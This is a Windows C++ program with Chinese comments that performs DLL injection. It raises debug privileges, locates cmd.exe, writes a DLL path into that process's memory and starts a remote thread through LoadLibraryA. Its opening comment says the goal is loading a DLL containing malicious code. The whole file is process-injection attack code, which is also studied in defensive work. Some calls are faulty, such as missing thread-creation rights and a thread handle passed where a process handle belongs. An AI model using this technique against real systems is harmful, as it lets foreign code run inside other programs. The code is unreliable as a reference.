#include<stdio.h>
#include<tchar.h>
#include<iostream>
#include<windows.h>
#include<tlhelp32.h>
using namespace std;

//提升本进程权限——>获取目标进程的PID——>获得要注入进程的句柄——>在远程进程中开辟出一段内存——>将包含恶意代码的dll的名字写入上一步开辟出的内存中——>在被注入进程中创建新线程加载该dll——>卸载注入的dll
//typedef unsigned long       DWORD;
//typedef __nullterminated CONST CHAR *LPCSTR, *PCSTR;
//typedef void *HANDLE;
DWORD getProcessHandle(LPCTSTR lpProcessName)//根据进程名查找进程PID
{
	DWORD dwRet = 0;
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);/*CreateToolhelp32Snapshot函数为指定的进程、
																	   进程使用的堆[HEAP]、模块[MODULE]、
						   									   线程[THREAD]）建立一个快照[snapshot]。*/
	if (hSnapShot == INVALID_HANDLE_VALUE)
	{
		//句柄无效
		printf("\n获得PID=%s的进程快照失败%d", lpProcessName, GetLastError());
		return dwRet;
	}

	//快照抓取成功  
	PROCESSENTRY32 pe32;//声明进程入口对象
	pe32.dwSize = sizeof(PROCESSENTRY32);//填充进程入口大小
	Process32First(hSnapShot, &pe32);//遍历进程列表
	do
	{
		if (!lstrcmp(pe32.szExeFile, lpProcessName))
		{
			dwRet = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapShot, &pe32));
	CloseHandle(hSnapShot);
	return dwRet;

}


void EnableDebugPriv()
{
	HANDLE hToken;          // 进程访问令牌的句柄  
	LUID luid;              // 用于存储调试权对应的局local unique identifier  
	TOKEN_PRIVILEGES tkp;   // 要设置的权限  
	//获得进程访问令牌的句柄。第一参数是要修改访问权限的进程句柄；第二个参数指定要进行的操作类型
	//（TOKEN_ADJUST_PRIVILEGES：修改令牌的访问权限，TOKEN_QUERY：查询令牌）；第三个参数是返回的访问令牌指针
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	// 获取访问令牌  
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);   // 获得调试权的luid  
	tkp.PrivilegeCount = 1; // 设置调试权  
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof tkp, NULL, NULL); // 使进程拥有调试权  
	CloseHandle(hToken);
}

int main()
{
	EnableDebugPriv();//权限提升
	DWORD dwpid = getProcessHandle("cmd.exe");
	LPCSTR lpDllName = "D:\\fakedll.dll";

	//获得要注入进程的句柄，获得操作进程内存空间的权限，获取写进程内存空间的权限
	HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwpid);

	if (hProcess == NULL)
	{
		printf("\n获取进程句柄错误%d", GetLastError());
		return -1;
	}
	
	DWORD dwSize = strlen(lpDllName) + 1;
	LPVOID lpRemoteBuf = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);//在远程空间分配地址

	DWORD dwHasWrite = 0;
	if (WriteProcessMemory(hProcess, lpRemoteBuf, lpDllName, dwSize,(SIZE_T*)&dwHasWrite))//写入内存函数执行成功返回非零
	{
		if (dwHasWrite != dwSize)
		{
			//写入内存不完整，释放内存
			VirtualFreeEx(hProcess, lpRemoteBuf, dwSize, MEM_COMMIT);
			CloseHandle(hProcess);
			return -1;
		}
	}
	else
	{
		printf("\n写入远程进程内存空间出错%d", GetLastError());
		CloseHandle(hProcess);
		return -1;
	}
	//写入成功
	DWORD dwNewThreadId;
	LPVOID lpLoadDll = LoadLibraryA;//使用LoadLibrary函数来加载动态连接库
	//将LoadLibraryA作为线程函数,参数为Dll，创建新线程
	HANDLE hNewRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpLoadDll, lpRemoteBuf, 0, &dwNewThreadId);
	//HANDLE hNewRemoteThread=
	if (hNewRemoteThread == NULL)
	{
		printf("\n建立远程线程失败%d", GetLastError());
		CloseHandle(hProcess);
		return -1;
	}
	//等待对象句柄返回
	WaitForSingleObject(hNewRemoteThread, INFINITE);

	CloseHandle(hNewRemoteThread);


	//准备卸载之前注入的Dll 
	DWORD dwHandle, dwID;
	LPVOID pFunc = GetModuleHandleA;//获得在远程线程中被注入的Dll的句柄 
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunc, lpRemoteBuf, 0, &dwID);
	WaitForSingleObject(hThread, INFINITE);
	GetExitCodeThread(hThread, &dwHandle);//线程的结束码即为Dll模块儿的句柄 
	CloseHandle(hThread);
	pFunc = FreeLibrary;
	hThread = CreateRemoteThread(hThread, NULL, 0, (LPTHREAD_START_ROUTINE)pFunc, (LPVOID)dwHandle, 0, &dwID); //将FreeLibraryA注入到远程线程中去卸载Dll 
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	system("pause");
	return 0;
}